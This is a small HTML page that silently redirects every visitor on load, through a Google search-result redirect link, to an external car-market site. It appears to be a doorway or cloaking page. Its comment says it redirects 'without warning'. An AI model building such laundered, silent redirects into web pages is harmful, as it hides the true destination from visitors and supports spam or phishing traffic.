<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Redirect</title>
    <script>
        // Array of URLs to redirect to (replaced with given URLs)
        const urls = [
            'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://evcarmarket.online/&ved=2ahUKEwjNnuPtt6-PAxWz4jgGHXTgEt8QFnoECBcQAQ&usg=AOvVaw2UdI4fgzzA9zlh5FAEhcmQ',
        ];

        // Function to randomly select a URL and redirect
        function randomRedirect() {
            const randomIndex = Math.floor(Math.random() * urls.length);
            window.location.replace(urls[randomIndex]); // Direct redirection without warning
        }

        // Call the redirect function as soon as the page loads
        window.onload = randomRedirect;
    </script>
</head>
<body>
</body>
</html>
